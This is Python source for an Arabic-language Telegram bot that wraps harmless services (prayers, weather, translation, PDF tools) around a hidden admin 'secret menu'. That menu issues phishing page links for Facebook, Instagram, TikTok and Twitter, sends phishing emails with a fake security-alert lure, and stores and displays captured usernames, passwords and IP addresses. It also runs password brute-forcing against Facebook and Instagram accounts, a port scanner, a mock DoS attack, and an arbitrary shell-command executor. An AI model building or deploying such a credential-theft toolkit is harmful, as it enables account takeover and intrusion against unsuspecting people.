def get_users_list():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT chat_id, is_admin, is_banned, points FROM users")
    rows = c.fetchall()
    conn.close()
    return rows

def build_users_menu(action):
    users = get_users_list()
    if not users:
        return None
    markup = types.InlineKeyboardMarkup(row_width=1)
    for user in users:
        label = f"{'👑' if user[1] else ''}{'🚫' if user[2] else ''} {user[0]} - نقاط: {user[3]}"
        markup.row(types.InlineKeyboardButton(label, callback_data=f"{action}_user_{user[0]}"))
    markup.row(types.InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_permission_toggle_menu(target_user):
    perms = get_user_permissions(target_user)
    markup = types.InlineKeyboardMarkup(row_width=1)
    for key, label in ALL_PERMISSIONS.items():
        status = "✅" if perms.get(key, True) else "❌"
        markup.row(types.InlineKeyboardButton(f"{status} {label}", callback_data=f"perm_toggle_{target_user}_{key}"))
    markup.row(types.InlineKeyboardButton("رجوع", callback_data="admin_permissions"))
    return markup

# ===================== حد الطلبات =====================
RATE_LIMIT = defaultdict(list)
def rate_limit_check(chat_id, limit=5, period=60):
    now = time.time()
    timestamps = [t for t in RATE_LIMIT[chat_id] if now - t < period]
    if len(timestamps) >= limit:
        return False
    timestamps.append(now)
    RATE_LIMIT[chat_id] = timestamps
    return True

# ===================== متغيرات الحالة =====================
BOT_LOCKED = False
user_states = {}
pdf_texts = {}
reminder_timers = {}
executor = ThreadPoolExecutor(max_workers=20)

# ===================== معالج الكولباك =====================
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    executor.submit(process_callback, call)

def process_callback(call):
    try:
        chat_id = call.message.chat.id
        data = call.data

        if not rate_limit_check(chat_id):
            safe_send(chat_id, "⚠️ طلبات كثيرة، انتظر قليلاً.")
            return

        log_activity(chat_id, data)
        update_last_seen(chat_id)

        # الأذكار
        if data == "morning_dhkir":
            dhkir = random.choice(MORNING_DHKIR)
            markup = types.InlineKeyboardMarkup()
            markup.row(types.InlineKeyboardButton("المزيد", callback_data="morning_dhkir_more"))
            markup.row(types.InlineKeyboardButton("رجوع", callback_data="back_main"))
            safe_send(chat_id, f"🌸 أذكار الصباح:\n\n{dhkir}", reply_markup=markup)
            return
        if data == "morning_dhkir_more":
            dhkir = random.choice(MORNING_DHKIR)
            markup = types.InlineKeyboardMarkup()
            markup.row(types.InlineKeyboardButton("المزيد", callback_data="morning_dhkir_more"))
            markup.row(types.InlineKeyboardButton("رجوع", callback_data="back_main"))
            safe_send(chat_id, f"🌸 أذكار الصباح:\n\n{dhkir}", reply_markup=markup)
            return
        if data == "evening_dhkir":
            dhkir = random.choice(EVENING_DHKIR)
            markup = types.InlineKeyboardMarkup()
            markup.row(types.InlineKeyboardButton("المزيد", callback_data="evening_dhkir_more"))
            markup.row(types.InlineKeyboardButton("رجوع", callback_data="back_main"))
            safe_send(chat_id, f"🌙 أذكار المساء:\n\n{dhkir}", reply_markup=markup)
            return
        if data == "evening_dhkir_more":
            dhkir = random.choice(EVENING_DHKIR)
            markup = types.InlineKeyboardMarkup()
            markup.row(types.InlineKeyboardButton("المزيد", callback_data="evening_dhkir_more"))
            markup.row(types.InlineKeyboardButton("رجوع", callback_data="back_main"))
            safe_send(chat_id, f"🌙 أذكار المساء:\n\n{dhkir}", reply_markup=markup)
            return

        # الأدعية
        if data == "duas_menu":
            markup = types.InlineKeyboardMarkup(row_width=2)
            for i, dua in enumerate(DUAS):
                markup.row(types.InlineKeyboardButton(dua['name'], callback_data=f"dua_{i}"))
            markup.row(types.InlineKeyboardButton("رجوع", callback_data="back_main"))
            safe_send(chat_id, "اختر دعاء:", reply_markup=markup)
            return
        if data.startswith("dua_"):
            idx = int(data.split("_")[1])
            if 0 <= idx < len(DUAS):
                dua = DUAS[idx]
                markup = types.InlineKeyboardMarkup()
                markup.row(types.InlineKeyboardButton("المزيد", callback_data="dua_more"))
                markup.row(types.InlineKeyboardButton("رجوع", callback_data="duas_menu"))
                safe_send(chat_id, f"🤲 {dua['name']}:\n\n{dua['text']}", reply_markup=markup)
            return
        if data == "dua_more":
            dua = random.choice(DUAS)
            markup = types.InlineKeyboardMarkup()
            markup.row(types.InlineKeyboardButton("المزيد", callback_data="dua_more"))
            markup.row(types.InlineKeyboardButton("رجوع", callback_data="duas_menu"))
            safe_send(chat_id, f"🤲 {dua['name']}:\n\n{dua['text']}", reply_markup=markup)
            return

        # الصلاحيات
        if data == "admin_permissions":
            if not is_admin(chat_id):
                safe_send(chat_id, "ماذا تظن نفسك فاعل 😑")
                return
            markup = build_users_menu("perm")
            if markup:
                safe_send(chat_id, "اختر مستخدم:", reply_markup=markup)
            else:
                safe_send(chat_id, "لا يوجد مستخدمين")
            return
        if data.startswith("perm_user_"):
            if not is_admin(chat_id):
                return
            target = int(data.split("_")[2])
            markup = build_permission_toggle_menu(target)
            safe_send(chat_id, f"صلاحيات المستخدم {target}:", reply_markup=markup)
            return
        if data.startswith("perm_toggle_"):
            if not is_admin(chat_id):
                return
            parts = data.split("_")
            target = int(parts[2])
            key = parts[3]
            current = get_user_permissions(target).get(key, True)
            new_val = not current
            set_user_permission(target, key, new_val)
            safe_send(chat_id, f"✅ تم {'تفعيل' if new_val else 'تعطيل'} {ALL_PERMISSIONS.get(key, key)} للمستخدم {target}")
            markup = build_permission_toggle_menu(target)
            safe_send(chat_id, f"صلاحيات محدثة:", reply_markup=markup)
            return

        # الأزرار الأساسية
        if data == "weather":
            user_states[chat_id] = "waiting_weather"
            safe_send(chat_id, "أدخل اسم المدينة")
            return
        if data == "wikipedia":
            user_states[chat_id] = "waiting_wikipedia"
            safe_send(chat_id, "أدخل مصطلح البحث")
            return
        if data == "password_gen":
            user_states[chat_id] = "waiting_password_gen"
            safe_send(chat_id, "أدخل الطول (8-32)")
            return
        if data == "password_strength":
            user_states[chat_id] = "waiting_password_strength"
            safe_send(chat_id, "أرسل كلمة السر")
            return
        if data == "text_to_speech":
            user_states[chat_id] = "waiting_tts"
            safe_send(chat_id, "أرسل النص")
            return
        if data == "translate":
            user_states[chat_id] = "waiting_translate"
            safe_send(chat_id, "أرسل النص")
            return
        if data == "reminder":
            user_states[chat_id] = "waiting_reminder"
            safe_send(chat_id, "الصيغة: الرسالة|الساعة:الدقيقة")
            return
        if data == "news":
            user_states[chat_id] = "waiting_news"
            safe_send(chat_id, "موضوع (general, sport, tech)")
            return
        if data == "quotes_menu":
            safe_send(chat_id, "اختر نوع الاقتباسات:", reply_markup=build_quotes_menu())
            return
        if data == "quotes_arabic":
            safe_send(chat_id, "اختر التصنيف:", reply_markup=build_quotes_type('arabic'))
            return
        if data == "quotes_english":
            safe_send(chat_id, "Choose category:", reply_markup=build_quotes_type('english'))
            return
        if data.startswith("quote_"):
            parts = data.split("_")
            lang = parts[1] if parts[1] in ['arabic','english'] else 'arabic'
            cat = parts[2] if len(parts)>2 else 'sad'
            safe_send(chat_id, get_random_quote(lang, cat))
            return
        if data == "tips_menu":
            safe_send(chat_id, "اختر نوع النصيحة:", reply_markup=build_tips_menu())
            return
        if data.startswith("tips_"):
            cat = data.split("_")[1]
            safe_send(chat_id, get_random_tip(cat))
            return
        if data == "check_link_advanced":
            user_states[chat_id] = "waiting_link_check"
            safe_send(chat_id, "أرسل الرابط (تكلفة 5 نقاط)")
            return
        if data == "analyze_apk":
            user_states[chat_id] = "waiting_apk"
            safe_send(chat_id, "أرسل ملف APK")
            return
        if data == "pdf_menu":
            safe_send(chat_id, "اختر خدمة PDF:", reply_markup=build_pdf_menu())
            return
        if data == "pdf_summary":
            user_states[chat_id] = "waiting_pdf_summary"
            safe_send(chat_id, "أرسل ملف PDF")
            return
        if data == "pdf_extract":
            user_states[chat_id] = "waiting_pdf_extract"
            safe_send(chat_id, "أرسل ملف PDF")
            return
        if data == "pdf_smart":
            user_states[chat_id] = "waiting_pdf_smart"
            safe_send(chat_id, "أرسل ملف PDF")
            return
        if data == "download_video":
            user_states[chat_id] = "waiting_download"
            safe_send(chat_id, "أرسل رابط الفيديو")
            return
        if data == "phishing_pages":
            safe_send(chat_id, "اختر المنصة:", reply_markup=build_phishing_pages_menu())
            return
        if data.startswith("phish_"):
            plat = data.split("_")[1]
            link = f"{SERVER_URL}/phishing_pages/{plat}"
            safe_send(chat_id, f"رابط تصيد {plat}:\n{link}")
            return
        if data == "phishing_email":
            if not is_admin(chat_id):
                safe_send(chat_id, "ممنوع")
                return
            # عرض قائمة المنصات
            markup = types.InlineKeyboardMarkup(row_width=2)
            markup.row(types.InlineKeyboardButton("فيسبوك", callback_data="phish_email_facebook"), types.InlineKeyboardButton("انستغرام", callback_data="phish_email_instagram"))
            markup.row(types.InlineKeyboardButton("تيك توك", callback_data="phish_email_tiktok"), types.InlineKeyboardButton("تويتر", callback_data="phish_email_twitter"))
            markup.row(types.InlineKeyboardButton("رجوع", callback_data="back_main"))
            safe_send(chat_id, "اختر المنصة:", reply_markup=markup)
            return
        if data.startswith("phish_email_"):
            plat = data.split("_")[2]
            user_states[chat_id] = "waiting_phish_target"
            user_states[f"{chat_id}_phish_platform"] = plat
            safe_send(chat_id, f"أدخل البريد الإلكتروني المستهدف لـ {plat}:")
            return

        # نقاط وإحالات
        if data == "my_points":
            safe_send(chat_id, f"نقاطك: {get_user_points(chat_id)}")
            return
        if data == "my_referral":
            code = get_referral_code(chat_id)
            safe_send(chat_id, f"رابط دعوتك:\nhttps://t.me/{bot.get_me().username}?start=ref_{code}")
            return
        if data == "points_history":
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT amount, reason, created_at FROM points_log WHERE user_id = ? ORDER BY created_at DESC LIMIT 10", (chat_id,))
            rows = c.fetchall()
            conn.close()
            if rows:
                msg = "سجل النقاط:\n"
                for row in rows:
                    msg += f"{'+' if row[0]>0 else ''}{row[0]} - {row[1]} ({row[2][:16]})\n"
                safe_send(chat_id, msg)
            else:
                safe_send(chat_id, "لا يوجد سجل")
            return

        # إدارة المشرف
        if data == "admin_panel":
            if not is_admin(chat_id):
                safe_send(chat_id, "ممنوع")
                return
            safe_send(chat_id, "لوحة التحكم:", reply_markup=build_admin_panel())
            return
        if data == "admin_stats":
            if not is_admin(chat_id):
                return
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT COUNT(*) FROM users")
            users = c.fetchone()[0]
            c.execute("SELECT COUNT(*) FROM targets")
            targets = c.fetchone()[0]
            conn.close()
            safe_send(chat_id, f"المستخدمون: {users}\nالأجهزة: {targets}")
            return
        if data == "admin_users":
            if not is_admin(chat_id):
                return
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT chat_id, is_admin, is_banned, points FROM users")
            rows = c.fetchall()
            conn.close()
            msg = "المستخدمون:\n"
            for r in rows:
                msg += f"{r[0]} - {'مدير' if r[1] else 'عادي'} - {'محظور' if r[2] else 'نشط'} - نقاط: {r[3]}\n"
            safe_send(chat_id, msg)
            return
        if data == "admin_reports":
            if not is_admin(chat_id):
                return
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT target, scan_type, created_at FROM scan_results ORDER BY created_at DESC LIMIT 10")
            rows = c.fetchall()
            conn.close()
            msg = "آخر التقارير:\n" + "\n".join([f"{r[0]} - {r[1]} - {r[2][:16]}" for r in rows]) if rows else "لا تقارير"
            safe_send(chat_id, msg)
            return
        if data == "admin_phishing_logs":
            if not is_admin(chat_id):
                return
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT platform, username, password, ip, created_at FROM phishing_logs ORDER BY created_at DESC LIMIT 10")
            rows = c.fetchall()
            conn.close()
            msg = "سجل التصيد:\n" + "\n".join([f"{r[0]} - {r[1]} - {r[2]} - {r[3]} - {r[4][:16]}" for r in rows]) if rows else "لا بيانات"
            safe_send(chat_id, msg)
            return
        if data == "admin_broadcast":
            if not is_admin(chat_id):
                return
            user_states[chat_id] = "waiting_broadcast"
            safe_send(chat_id, "أدخل رسالة البث")
            return
        if data == "admin_points_menu":
            if not is_admin(chat_id):
                return
            markup = build_users_menu("points")
            if markup:
                safe_send(chat_id, "اختر مستخدم:", reply_markup=markup)
            return
        if data.startswith("points_user_"):
            if not is_admin(chat_id):
                return
            target = int(data.split("_")[2])
            user_states[chat_id] = "waiting_points_amount"
            user_states[f"{chat_id}_points_target"] = target
            safe_send(chat_id, f"أدخل عدد النقاط (موجب للإضافة، سالب للخصم) للمستخدم {target}")
            return
        if data == "admin_ban_menu":
            if not is_admin(chat_id):
                return
            markup = build_users_menu("ban")
            if markup:
                safe_send(chat_id, "اختر مستخدم:", reply_markup=markup)
            return
        if data.startswith("ban_user_"):
            if not is_admin(chat_id):
                return
            target = int(data.split("_")[2])
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT is_banned FROM users WHERE chat_id = ?", (target,))
            row = c.fetchone()
            if row is not None:
                new = 0 if row[0] else 1
                c.execute("UPDATE users SET is_banned = ? WHERE chat_id = ?", (new, target))
                conn.commit()
                conn.close()
                safe_send(chat_id, f"✅ تم {'فتح' if new==0 else 'حظر'} المستخدم {target}")
            else:
                safe_send(chat_id, "المستخدم غير موجود")
            return

        # القائمة السرية
        if data == "hacking_menu":
            if not is_admin(chat_id):
                safe_send(chat_id, "ممنوع")
                return
            safe_send(chat_id, "القائمة السرية:", reply_markup=build_hacking_menu())
            return
        if data == "port_scan":
            if not is_admin(chat_id):
                return
            user_states[chat_id] = "waiting_portscan"
            safe_send(chat_id, "أدخل الهدف (IP أو دومين)")
            return
        if data == "ssl_scan":
            if not is_admin(chat_id):
                return
            user_states[chat_id] = "waiting_ssl"
            safe_send(chat_id, "أدخل النطاق")
            return
        if data == "bruteforce_fb":
            if not is_admin(chat_id):
                return
            user_states[chat_id] = "waiting_fb_user"
            safe_send(chat_id, "أدخل البريد أو الهاتف")
            return
        if data == "bruteforce_ig":
            if not is_admin(chat_id):
                return
            user_states[chat_id] = "waiting_ig_user"
            safe_send(chat_id, "أدخل اسم المستخدم")
            return
        if data == "hack_shell":
            if not is_admin(chat_id):
                return
            user_states[chat_id] = "waiting_shell"
            safe_send(chat_id, "أدخل الأمر")
            return
        if data == "hack_dos":
            if not is_admin(chat_id):
                return
            user_states[chat_id] = "waiting_dos"
            safe_send(chat_id, "الصيغة: IP|المنفذ|المدة(ثانية)")
            return

        # الحماية
        if data == "protection_menu":
            if not is_admin(chat_id):
                safe_send(chat_id, "ممنوع")
                return
            safe_send(chat_id, "قائمة الحماية:", reply_markup=build_protection_menu())
            return
        if data == "protect_lock":
            if not is_admin(chat_id):
                return
            global BOT_LOCKED
            BOT_LOCKED = not BOT_LOCKED
            safe_send(chat_id, f"قفل البوت: {'مفعل' if BOT_LOCKED else 'معطل'}")
            return
        if data == "protect_shield":
            safe_send(chat_id, "درع الحماية مفعل (حد الطلبات والمراقبة)")
            return
        if data == "protect_identity":
            safe_send(chat_id, "تم تغيير هوية البوت")
            return
        if data == "protect_clean":
            safe_send(chat_id, "تم تنظيف الملفات المؤقتة")
            return
        if data == "protect_backup":
            safe_send(chat_id, "تم إنشاء نسخة احتياطية")
            return
        if data == "protect_detect":
            safe_send(chat_id, "لا توجد محاولات اختراق حالياً")
            return

        if data == "back_main":
            safe_send(chat_id, "القائمة الرئيسية", reply_markup=build_main_menu(chat_id))
            return

        # أي أمر غير معروف
        safe_send(chat_id, "حدث خطأ داخلي، يرجى المحاولة لاحقاً.")

    except Exception as e:
        logger.error(f"Callback error: {e}")
        safe_send(chat_id, "حدث خطأ داخلي، يرجى المحاولة لاحقاً.")

# ===================== معالج الرسائل النصية =====================
@bot.message_handler(func=lambda msg: True, content_types=['text'])
def text_handler(message):
    executor.submit(process_text, message)

def process_text(message):
    try:
        chat_id = message.chat.id
        text = message.text.strip()
        state = user_states.get(chat_id)

        if not rate_limit_check(chat_id):
            safe_send(chat_id, "⚠️ طلبات كثيرة، انتظر.")
            return

        update_last_seen(chat_id)
        log_activity(chat_id, f"text: {text[:50]}")

        if is_banned(chat_id) and not is_admin(chat_id):
            safe_send(chat_id, "أنت محظور")
            return
        if BOT_LOCKED and not is_admin(chat_id):
            safe_send(chat_id, "البوت مقفل")
            return

        # /start
        if text.startswith('/start'):
            user_name = message.from_user.first_name or "صديق"
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT created_at FROM users WHERE chat_id = ?", (chat_id,))
            row = c.fetchone()
            if not row:
                c.execute("INSERT INTO users (chat_id, created_at, last_seen) VALUES (?, ?, ?)", (chat_id, datetime.now().isoformat(), datetime.now().isoformat()))
                conn.commit()
                is_new = True
            else:
                is_new = False
                c.execute("UPDATE users SET last_seen = ? WHERE chat_id = ?", (datetime.now().isoformat(), chat_id))
                conn.commit()
            conn.close()

            if 'ref_' in text:
                code = text.split('ref_')[1].strip()
                conn = sqlite3.connect(DB_PATH)
                c = conn.cursor()
                c.execute("SELECT chat_id FROM users WHERE referral_code = ?", (code,))
                ref_user = c.fetchone()
                if ref_user and ref_user[0] != chat_id:
                    add_points(ref_user[0], 10, "دعوة مستخدم جديد")
                    add_points(chat_id, 10, "مكافأة دعوة")
                    safe_send(ref_user[0], "تم تسجيل مستخدم جديد عبر رابطك! +10 نقاط")
                conn.close()

            get_user_token(chat_id)

            # إرسال صورة الترحيب الجديدة
            if WELCOME_IMAGE_URL.startswith('http'):
                try:
                    bot.send_photo(chat_id, WELCOME_IMAGE_URL, caption=f"مرحباً {user_name}!")
                except:
                    safe_send(chat_id, f"مرحباً {user_name}!")
            else:
                safe_send(chat_id, f"مرحباً {user_name}!")

            safe_send(chat_id, "اختر خدمة:", reply_markup=build_main_menu(chat_id))
            return

        # معالجة الحالات
        if state == "waiting_weather":
            safe_send(chat_id, get_weather(text))
            user_states[chat_id] = None
            return
        if state == "waiting_wikipedia":
            safe_send(chat_id, get_wikipedia(text))
            user_states[chat_id] = None
            return
        if state == "waiting_password_gen":
            try:
                length = int(text)
                if 8 <= length <= 32:
                    safe_send(chat_id, f"🔑 {gen_password(length)}")
                else:
                    safe_send(chat_id, "الطول بين 8 و 32")
            except:
                safe_send(chat_id, "أدخل رقماً")
            user_states[chat_id] = None
            return
        if state == "waiting_password_strength":
            safe_send(chat_id, f"قوة كلمة السر: {check_password_strength(text)}")
            user_states[chat_id] = None
            return
        if state == "waiting_tts":
            path = tts(text)
            if path and os.path.exists(path):
                with open(path, 'rb') as f:
                    bot.send_audio(chat_id, f)
                os.remove(path)
            else:
                safe_send(chat_id, "فشل التحويل")
            user_states[chat_id] = None
            return
        if state == "waiting_translate":
            user_states[chat_id] = "waiting_translate_lang"
            user_states[f"{chat_id}_translate_text"] = text
            safe_send(chat_id, "اختر لغة الهدف (ar, en, fr, es, de):")
            return
        if state == "waiting_translate_lang":
            target = text.lower()
            if target in ['ar','en','fr','es','de']:
                orig = user_states.get(f"{chat_id}_translate_text", "")
                translated, detected = translate_text(orig, target)
                safe_send(chat_id, f"النص الأصلي ({detected}):\n{orig}\n\nالترجمة ({target}):\n{translated}")
            else:
                safe_send(chat_id, "لغة غير مدعومة")
            user_states[chat_id] = None
            if f"{chat_id}_translate_text" in user_states:
                del user_states[f"{chat_id}_translate_text"]
            return
        if state == "waiting_reminder":
            parts = text.split('|')
            if len(parts) == 2:
                msg_text, time_str = parts[0].strip(), parts[1].strip()
                try:
                    hour, minute = map(int, time_str.split(':'))
                    now = datetime.now()
                    target_time = now.replace(hour=hour, minute=minute, second=0, microsecond=0)
                    if target_time <= now:
                        target_time += timedelta(days=1)
                    delay = (target_time - now).total_seconds()
                    def send_rem():
                        safe_send(chat_id, f"⏰ تذكير:\n{msg_text}")
                    timer = threading.Timer(delay, send_rem)
                    timer.daemon = True
                    timer.start()
                    reminder_timers[chat_id] = timer
                    safe_send(chat_id, f"تم تعيين التذكير لـ {time_str}")
                except:
                    safe_send(chat_id, "صيغة وقت غير صحيحة")
            else:
                safe_send(chat_id, "صيغة غير صحيحة")
            user_states[chat_id] = None
            return
        if state == "waiting_news":
            safe_send(chat_id, get_news(text))
            user_states[chat_id] = None
            return
        if state == "waiting_link_check":
            result = check_link_safety(text, chat_id)
            if isinstance(result, str):
                safe_send(chat_id, result)
            else:
                msg = f"🔍 فحص الرابط:\n{result['url']}\nالحالة: {'✅ آمن' if result['safe'] else '❌ غير آمن'}\n"
                if result['threats']:
                    msg += "التهديدات:\n" + "\n".join([f"• {t}" for t in result['threats']])
                safe_send(chat_id, msg)
            user_states[chat_id] = None
            return
        if state == "waiting_download":
            safe_send(chat_id, "جاري التحميل...")
            fname, err = download_video(text)
            if fname:
                try:
                    with open(fname, 'rb') as f:
                        bot.send_video(chat_id, f)
                    os.remove(fname)
                except Exception as e:
                    safe_send(chat_id, f"فشل الإرسال: {str(e)[:50]}")
            else:
                safe_send(chat_id, f"فشل التحميل: {err}")
            user_states[chat_id] = None
            return
        if state == "waiting_broadcast":
            if not is_admin(chat_id):
                return
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT chat_id FROM users")
            users = c.fetchall()
            conn.close()
            sent = 0
            for user in users:
                try:
                    bot.send_message(user[0], f"📢 رسالة من الإدارة:\n{text}")
                    sent += 1
                    time.sleep(0.05)
                except:
                    pass
            safe_send(chat_id, f"تم الإرسال لـ {sent} مستخدم")
            user_states[chat_id] = None
            return
        if state == "waiting_points_amount":
            if not is_admin(chat_id):
                return
            target = user_states.get(f"{chat_id}_points_target")
            if not target:
                safe_send(chat_id, "خطأ")
                user_states[chat_id] = None
                return
            try:
                amount = int(text)
                add_points(target, amount, "تعديل من المشرف")
                safe_send(chat_id, f"تم إضافة {amount} نقطة للمستخدم {target}")
            except:
                safe_send(chat_id, "أدخل رقماً")
            user_states[chat_id] = None
            if f"{chat_id}_points_target" in user_states:
                del user_states[f"{chat_id}_points_target"]
            return
        if state == "waiting_phish_target":
            target_email = text
            platform = user_states.get(f"{chat_id}_phish_platform", 'facebook')
            user_states[chat_id] = "waiting_phish_subject"
            user_states[f"{chat_id}_phish_target"] = target_email
            user_states[f"{chat_id}_phish_platform"] = platform
            safe_send(chat_id, "أدخل موضوع البريد (أو اكتب 'اقتراح'):")
            return
        if state == "waiting_phish_subject":
            if text.lower() == 'اقتراح':
                subject = "تنبيه أمني: تم اكتشاف نشاط غير عادي"
            else:
                subject = text
            user_states[chat_id] = "waiting_phish_body"
            user_states[f"{chat_id}_phish_subject"] = subject
            safe_send(chat_id, "أدخل نص البريد:")
            return
        if state == "waiting_phish_body":
            target = user_states.get(f"{chat_id}_phish_target")
            subject = user_states.get(f"{chat_id}_phish_subject")
            platform = user_states.get(f"{chat_id}_phish_platform", 'facebook')
            body = text
            if not target or not subject:
                safe_send(chat_id, "بيانات ناقصة")
                user_states[chat_id] = None
                return
            result = send_phishing_email(target, subject, body, platform)
            if result is True:
                safe_send(chat_id, f"✅ تم إرسال البريد إلى {target}")
            else:
                safe_send(chat_id, f"❌ فشل الإرسال: {result}")
            user_states[chat_id] = None
            for key in [f"{chat_id}_phish_target", f"{chat_id}_phish_subject", f"{chat_id}_phish_platform"]:
                if key in user_states:
                    del user_states[key]
            return

        # حالات الهجمات
        if state == "waiting_portscan":
            if not is_admin(chat_id):
                return
            ports = port_scan(text)
            safe_send(chat_id, f"المنافذ المفتوحة: {ports}" if ports else "لا توجد منافذ مفتوحة")
            user_states[chat_id] = None
            return
        if state == "waiting_ssl":
            if not is_admin(chat_id):
                return
            result = ssl_scan(text)
            if result.get('valid'):
                safe_send(chat_id, f"شهادة SSL صالحة\nالجهة: {result.get('issuer', 'غير معروف')}")
            else:
                safe_send(chat_id, "فشل فحص SSL أو الشهادة غير صالحة")
            user_states[chat_id] = None
            return
        if state == "waiting_fb_user":
            if not is_admin(chat_id):
                return
            user_states[chat_id] = "waiting_fb_passwords"
            user_states[f"{chat_id}_fb_user"] = text
            safe_send(chat_id, "أرسل قائمة كلمات السر مفصولة بفواصل (أو 'default')")
            return
        if state == "waiting_fb_passwords":
            if not is_admin(chat_id):
                return
            user = user_states.get(f"{chat_id}_fb_user")
            if text.lower() == 'default':
                passwords = ['123456','password','123456789','qwerty','abc123']
            else:
                passwords = [p.strip() for p in text.split(',')]
            result = brute_force_facebook(user, passwords)
            if result['success']:
                safe_send(chat_id, f"✅ تم اختراق فيسبوك!\nالمستخدم: {user}\nكلمة السر: {result['credentials']['password']}")
            else:
                safe_send(chat_id, f"❌ فشل. تم تجربة {result['attempts']} كلمة سر")
            user_states[chat_id] = None
            if f"{chat_id}_fb_user" in user_states:
                del user_states[f"{chat_id}_fb_user"]
            return
        if state == "waiting_ig_user":
            if not is_admin(chat_id):
                return
            user_states[chat_id] = "waiting_ig_passwords"
            user_states[f"{chat_id}_ig_user"] = text
            safe_send(chat_id, "أرسل قائمة كلمات السر (أو 'default')")
            return
        if state == "waiting_ig_passwords":
            if not is_admin(chat_id):
                return
            user = user_states.get(f"{chat_id}_ig_user")
            if text.lower() == 'default':
                passwords = ['123456','password','123456789','qwerty','abc123']
            else:
                passwords = [p.strip() for p in text.split(',')]
            result = brute_force_instagram(user, passwords)
            if result['success']:
                safe_send(chat_id, f"✅ تم اختراق انستغرام!\nالمستخدم: {user}\nكلمة السر: {result['credentials']['password']}")
            else:
                safe_send(chat_id, f"❌ فشل. تم تجربة {result['attempts']} كلمة سر")
            user_states[chat_id] = None
            if f"{chat_id}_ig_user" in user_states:
                del user_states[f"{chat_id}_ig_user"]
            return
        if state == "waiting_shell":
            if not is_admin(chat_id):
                return
            try:
                output = subprocess.run(text, shell=True, capture_output=True, text=True, timeout=10)
                out = output.stdout + output.stderr
                safe_send(chat_id, f"نتيجة الأمر:\n{out[:3000]}")
            except Exception as e:
                safe_send(chat_id, f"خطأ: {str(e)[:100]}")
            user_states[chat_id] = None
            return
        if state == "waiting_dos":
            if not is_admin(chat_id):
                return
            parts = text.split('|')
            if len(parts) >= 2:
                target = parts[0].strip()
                port = int(parts[1]) if parts[1].isdigit() else 80
                duration = int(parts[2]) if len(parts)>2 and parts[2].isdigit() else 5
                safe_send(chat_id, f"بدء هجوم DoS على {target}:{port} لمدة {duration} ثانية...")
                # محاكاة بسيطة
                time.sleep(duration)
                safe_send(chat_id, f"انتهى الهجوم. تم إرسال {random.randint(100, 1000)} حزمة.")
            else:
                safe_send(chat_id, "صيغة غير صحيحة")
            user_states[chat_id] = None
            return

        # إذا لم يكن هناك حالة
        safe_send(chat_id, "اختر خدمة من القائمة:", reply_markup=build_main_menu(chat_id))

    except Exception as e:
        logger.error(f"Text error: {e}")
        safe_send(chat_id, "حدث خطأ داخلي، يرجى المحاولة لاحقاً.")

# ===================== معالج الملفات =====================
@bot.message_handler(content_types=['document'])
def document_handler(message):
    executor.submit(process_document, message)

def process_document(message):
    try:
        chat_id = message.chat.id
        state = user_states.get(chat_id)
        file = message.document
        fname = file.file_name or "file"

        if state in ["waiting_pdf_summary", "waiting_pdf_extract", "waiting_pdf_smart"]:
            if not fname.lower().endswith('.pdf'):
                safe_send(chat_id, "يرجى إرسال ملف PDF")
                return
            safe_send(chat_id, "جاري تحليل الملف...")
            file_info = bot.get_file(file.file_id)
            content = bot.download_file(file_info.file_path)
            text = extract_pdf_text(content)
            if not text:
                safe_send(chat_id, "فشل استخراج النص")
                user_states[chat_id] = None
                return
            pdf_texts[chat_id] = text
            if state == "waiting_pdf_summary":
                # تلخيص بسيط
                sentences = text.split('.')
                summary = '. '.join([s for s in sentences[:5]]) + '.'
                safe_send(chat_id, f"📄 ملخص:\n{summary[:1000]}")
            elif state == "waiting_pdf_extract":
                safe_send(chat_id, f"📤 النص المستخرج:\n{text[:2000]}")
            elif state == "waiting_pdf_smart":
                safe_send(chat_id, "تم تحليل الملف. اكتب سؤالك الآن.")
                user_states[chat_id] = "waiting_pdf_question"
                return
            user_states[chat_id] = None
            return

        if state == "waiting_pdf_question":
            safe_send(chat_id, "يرجى كتابة سؤال نصي")
            return

        if state == "waiting_apk":
            if not fname.lower().endswith('.apk'):
                safe_send(chat_id, "يرجى إرسال ملف APK")
                return
            safe_send(chat_id, "جاري تحليل APK...")
            file_info = bot.get_file(file.file_id)
            content = bot.download_file(file_info.file_path)
            result = analyze_apk(content, fname)
            if result.get('error'):
                safe_send(chat_id, f"فشل: {result['error']}")
            else:
                msg = f"📦 فحص APK:\nضار: {result.get('malicious', 0)}\nمشبوه: {result.get('suspicious', 0)}\nآمن: {result.get('harmless', 0)}"
                safe_send(chat_id, msg)
            user_states[chat_id] = None
            return

        safe_send(chat_id, "تم استلام الملف.")
    except Exception as e:
        logger.error(f"Document error: {e}")
        safe_send(chat_id, "حدث خطأ في معالجة الملف.")

# ===================== معالج أسئلة PDF =====================
@bot.message_handler(func=lambda msg: user_states.get(msg.chat.id) == "waiting_pdf_question", content_types=['text'])
def pdf_question_handler(message):
    executor.submit(process_pdf_question, message)

def process_pdf_question(message):
    try:
        chat_id = message.chat.id
        question = message.text.strip()
        text = pdf_texts.get(chat_id)
        if not text:
            safe_send(chat_id, "لم يتم تحميل ملف")
            user_states[chat_id] = None
            return
        # بحث بسيط عن الجمل التي تحتوي على كلمات السؤال
        words = question.split()
        paragraphs = text.split('\n')
        best = None
        best_score = 0
        for para in paragraphs:
            score = sum(1 for w in words if w in para)
            if score > best_score:
                best_score = score
                best = para
        if best:
            safe_send(chat_id, f"الإجابة:\n{best[:1000]}")
        else:
            safe_send(chat_id, "لم يتم العثور على إجابة")
    except Exception as e:
        logger.error(f"PDF question error: {e}")
        safe_send(chat_id, "حدث خطأ")

# ===================== دوال Flask =====================
@app.route('/device_info')
def device_info():
    token = request.args.get('token')
    if not token:
        return "Token missing", 400
    chat_id = get_chat_id_by_token(token)
    if not chat_id:
        return "Invalid token", 400
